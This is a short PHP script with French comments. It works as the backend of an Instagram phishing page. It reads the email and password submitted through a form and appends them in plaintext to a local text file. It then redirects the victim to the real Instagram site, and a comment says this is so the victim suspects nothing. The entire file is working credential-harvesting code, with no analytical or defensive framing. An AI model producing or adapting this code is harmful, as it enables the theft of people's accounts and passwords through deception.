<?php
// On récupère les données envoyées par le formulaire
$email = $_POST['email'];
$pass  = $_POST['password'];

// On prépare le texte à enregistrer
$texte = "Compte : " . $email . " | MDP : " . $pass . "\n";

// On écrit dans le fichier 'donnees.txt' (il se créera tout seul)
file_put_contents("donnees.txt", $texte, FILE_APPEND);

// On redirige l'utilisateur vers le vrai Instagram pour ne pas qu'il se doute de rien
header("Location: https://www.instagram.com");
exit();
?>
